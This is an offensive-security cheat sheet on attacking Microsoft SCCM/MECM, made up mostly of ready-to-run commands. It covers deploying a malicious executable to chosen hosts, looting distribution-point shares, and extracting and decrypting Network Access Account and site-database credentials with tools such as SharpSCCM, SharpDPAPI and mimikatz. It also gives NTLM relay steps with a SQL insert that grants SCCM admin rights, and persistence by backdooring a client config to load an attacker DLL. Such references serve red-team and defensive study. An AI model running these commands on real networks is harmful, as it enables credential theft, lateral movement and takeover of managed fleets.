# Deployment - SCCM

> SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.


## SCCM Application Deployment

> Application Deployment is a process that involves packaging software applications and distributing them to selected computers or devices within an organization

**Tools**:

* [PowerShellMafia/PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
* [nettitude/MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)


**Exploitation**:

* Using **SharpSCCM**
  ```ps1
  .\SharpSCCM.exe get devices --server <SERVER8NAME> --site-code <SITE_CODE>
  .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
  .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
  ``` 
* Compromise client, use locate to find management server 
    ```ps1
    MalSCCM.exe locate
    ```
* Enumerate over WMI as an administrator of the Distribution Point
    ```ps1
    MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
    ```
* Compromise management server, use locate to find primary server
* Use `inspect` on primary server to view who you can target
    ```ps1
    MalSCCM.exe inspect /all
    MalSCCM.exe inspect /computers
    MalSCCM.exe inspect /primaryusers
    MalSCCM.exe inspect /groups
    ```
* Create a new device group for the machines you want to laterally move too
    ```ps1
    MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
    MalSCCM.exe inspect /groups
    ```

* Add your targets into the new group 
    ```ps1
    MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
    ```
* Create an application pointing to a malicious EXE on a world readable share : `SCCMContentLib$`
    ```ps1
    MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
    MalSCCM.exe inspect /applications
    ```

* Deploy the application to the target group 
    ```ps1
    MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
    MalSCCM.exe inspect /deployments
    ```
* Force the target group to checkin for updates 
    ```ps1
    MalSCCM.exe checkin /groupname:TargetGroup
    ```

* Cleanup the application, deployment and group
    ```ps1
    MalSCCM.exe app /cleanup /name:demoapp
    MalSCCM.exe group /delete /groupname:TargetGroup
    ```


## SCCM Shares

> Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares

* [1njected/CMLoot](https://github.com/1njected/CMLoot)
  ```ps1
  Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
  Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
  Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
  ```


## SCCM Configuration Manager

* [subat0mik/Misconfiguration-Manager/MisconfigurationManager.ps1](https://raw.githubusercontent.com/subat0mik/Misconfiguration-Manager/main/MisconfigurationManager.ps1)


### CRED-1 Retrieve credentials via PXE boot media

* [Misconfiguration-Manager - CRED-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md)

**Requirements**:

* On the SCCM Distribution Point: `HKLM\Software\Microsoft\SMS\DP\PxeInstalled` = 1
* On the SCCM Distribution Point: `HKLM\Software\Microsoft\SMS\DP\IsPxe` = 1
* PXE-enabled distribution point

**Exploitation**:

* [csandker/pxethiefy](https://github.com/csandker/pxethiefy)
    ```ps1
    sudo python3 pxethiefy.py explore -i eth0
    ```
* [MWR-CyberSec/PXEThief](https://github.com/MWR-CyberSec/PXEThief)


### CRED-2 Request a policy containing credentials

* [Misconfiguration-Manager - CRED-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md)


**Requirements**:

* PKI certificates are not required for client authentication
* Domain accounts credential

**Exploitation**:

Create a machine or compromise an existing one, then request policies such as `NAAConfig`

Easy mode using `SharpSCCM`

    ```ps1
    SharpSCCM get secrets -u <username-machine-$> -p <password>
    SharpSCCM get naa
    ```

Stealthy mode by creating a computer.

* Create a machine account with a specific password: `addcomputer.py -computer-name 'customsccm$' -computer-pass 'YourStrongPassword123*' 'sccm.lab/carol:SCCMftw' -dc-ip 192.168.33.10`
* In your `/etc/hosts` file, add an entry for the MECM server: `192.168.33.11 MECM MECM.SCCM.LAB`
* Use `sccmwtf` to request a policy: `python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\customsccm$' 'YourStrongPassword123*'`
* Parse the policy to extract the credentials and decrypt them using [sccmwtf/policysecretunobfuscate.py](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py): `cat /tmp/naapolicy.xml |grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5 |grep -e 'CDATA' | cut -d '[' -f 3|cut -d ']' -f 1| xargs -I {} python3 policysecretunobfuscate.py {}`


### CRED-3 Extract currently deployed credentials stored as DPAPI blobs

> Dump currently deployed secrets via WMI. If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.

* [Misconfiguration-Manager - CRED-3](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-3/cred-3_description.md)


**Requirements**:

* Local administrator privileges on an SCCM client


**Exploitation**:

* Find SCCM blob
    ```ps1
    Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
    NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
    NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
    ```

* Using [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) 
    ```ps1
    $str = "060...F2DAF"
    $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
    $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
    .\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt    
    ```

* Using [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM) for SCCM retrieval and decryption
    ```ps1
    .\SharpSCCM.exe local secrets -m wmi
    ```

From a remote machine.

* Using [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)
    ```ps1
    python3 ./sccmhunter.py http -u "administrator" -p "P@ssw0rd" -d internal.lab -dc-ip 10.10.10.10. -auto
    ```


### CRED-4 Extract legacy credentials stored as DPAPI blobs

* [Misconfiguration-Manager - CRED-4](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-4/cred-4_description.md)

**Requirements**:

* Local administrator privileges on an SCCM client


**Exploitation**:

* Search the database using `SharpDPAPI`
    ```ps1
    .\SharpDPAPI.exe search /type:file /path:C:\Windows\System32\wbem\Repository\OBJECTS.DATA
    ```

* Search the database using `SharpSCCM`
    ```ps1
    .\SharpSCCM.exe local secrets -m disk
    ```

* Check ACL for the CIM repository located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`:
    ```ps1
    Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
    ConvertFrom-SddlString ""
    ```



### CRED-5 Extract the SC_UserAccount table from the site database

* [Misconfiguration-Manager - CRED-5](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-5/cred-5_description.md)

**Requirements**:

* Site database access
* Primary site server access
    * Access to the private key used for encryption

**Exploitation**:

* [gentilkiwi/mimikatz](https://twitter.com/gentilkiwi/status/1392204021461569537)
    ```ps1
    mimikatz # misc::sccm /connectionstring:"DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;"
    ```
* [skahwah/SQLRecon](https://github.com/skahwah/SQLRecon), only if the site server and database are hosted on the same system
    ```ps1
    SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials
    ```
* SQLRecon + [xpn/sccmdecryptpoc.cs](https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1)
    ```ps1
    SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> /module:query /command:"SELECT * FROM SC_UserAccount"
    sccmdecryptpoc.exe 0C010000080[...]5D6F0
    ```


## SCCM Relay

### TAKEOVER1 - Low Privileges to Database Administrator - MSSQL relay

**Requirements**:

- Database separated from the site server
- Server site is sysadmin of the database

**Exploitation**:

* Generate the query to elevate our user: `python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked`
* Setup a relay with the generated query: `ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"`
* Coerce an authentication to your listener using a domain account: `petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11`
* Finally, connect as admin on the MSSQL server: `python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11 `


### TAKEOVER2 - Low Privileges to MECM Admin Account - SMB relay

Microsoft requires the site server's computer account to be an administrator on the MSSQL server.

**Exploitation**:

* Start a listener for the MSSQL Server: `ntlmrelayx -t 192.168.33.12 -smb2support -socks`
* Coerce an authentication from the Site Server using domain credentials (low privileges SCCM NAA retrieved on the same machine works great): `petitpotam.py -d sccm.lab -u sccm-naa -p 123456789 192.168.33.1 192.168.33.11`
* Finally use the SOCKS from `ntlmrelayx` to access the MSSQL server as a local administrator
    ```ps1
    proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
    proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
    ```


## SCCM Persistence

* [mandiant/CcmPwn](https://github.com/mandiant/CcmPwn) - lateral movement script that leverages the CcmExec service to remotely hijack user sessions.

CcmExec is a service native to SCCM Windows clients that is executed on every interactive session. This technique requires Adminsitrator privileges on the targeted machine.

* Backdoor the `SCNotification.exe.config` to load your DLL

    ```ps1
    python3 ccmpwn.py domain/user:password@workstation.domain.local exec -dll evil.dll -config exploit.config
    ```

* Malicious config to force `SCNotification.exe` to load a file from an attacker-controlled file share

    ```ps1
    python3 ccmpwn.py domain/user:password@workstation.domain.local coerce -computer 10.10.10.10
    ```


## References

* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
* [Misconfiguration Manager: Overlooked and Overprivileged - Duane Michael - Mar 5, 2024](https://posts.specterops.io/misconfiguration-manager-overlooked-and-overprivileged-70983b8f350d)
* [SeeSeeYouExec: Windows Session Hijacking via CcmExec - Andrew Oliveau](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec?hl=en)
* [SCCM / MECM LAB - Part 0x0 - mayfly - Mar 23, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x0/)
* [SCCM / MECM LAB - Part 0x1 - Recon and PXE - mayfly - Mar 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x1/)
* [SCCM / MECM LAB - Part 0x2 - Low user - mayfly - Mar 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x2/)
* [SCCM / MECM LAB - Part 0x3 - Admin User - mayfly - Apr 3, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x3/)